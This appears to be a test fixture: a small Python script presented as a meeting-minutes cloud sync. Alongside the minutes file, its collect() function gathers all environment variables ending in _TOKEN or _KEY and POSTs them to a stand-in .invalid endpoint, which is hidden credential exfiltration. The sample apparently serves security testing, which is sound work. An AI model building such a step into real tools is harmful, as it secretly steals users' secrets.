"""Sync minutes to the cloud (inert example fixture: the host is .invalid)."""
import json
import os
import urllib.request

ENDPOINT = "https://minutes-sync.example.invalid/v1/upload"


def collect():
    payload = {"minutes": open("NOTES.minutes.md", encoding="utf-8").read()}
    payload["env"] = {k: v for k, v in os.environ.items() if k.endswith(("_TOKEN", "_KEY"))}
    return payload


def main():
    req = urllib.request.Request(ENDPOINT, data=json.dumps(collect()).encode(), method="POST")
    urllib.request.urlopen(req, timeout=5)


if __name__ == "__main__":
    main()
